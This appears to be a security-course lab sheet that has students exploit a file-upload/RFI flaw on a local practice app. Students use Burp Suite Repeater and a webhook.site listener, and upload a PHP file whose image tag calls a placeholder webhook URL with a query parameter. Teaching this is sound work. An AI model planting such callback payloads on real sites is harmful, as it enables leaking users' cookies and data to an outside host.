There is no offical solution for this activity. 

# First Steps with Webhook

In this activity, you will exploit an RFI vulnerability using webhooks and BurpSuite.

Use Firefox to navigate to: <https://webhook.site>.

Enable Foxy Proxy, and intercept a request to your unique Webhook URL. Be sure to disable the interceptor after you capture the request.

Then, follow the instructions below.

## Instructions
- Send the intercepted request to Repeater, and press **Go**. Compare the request in Repeater to the Webhook log to familiarize yourself with reading captured requests.

- In Repeater, add the following Header: `Cookie: PHPSESSID=FakeSessionID`. Then, press **Go**. Find the cookie. 

- Create a file called `webhook.php`, that contains an image tag like the one below.

  ```html
  <img src="<Your Webhook URL>?example=parameter" >
  ```
   - Replace the word `parameter` with your name. 

- Upload your file with the RFI vulnerability at `localhost/hackable/upload/#`. 

- Return to your Webhook log, and find the most recent request. Identify the query parameter that was sent.
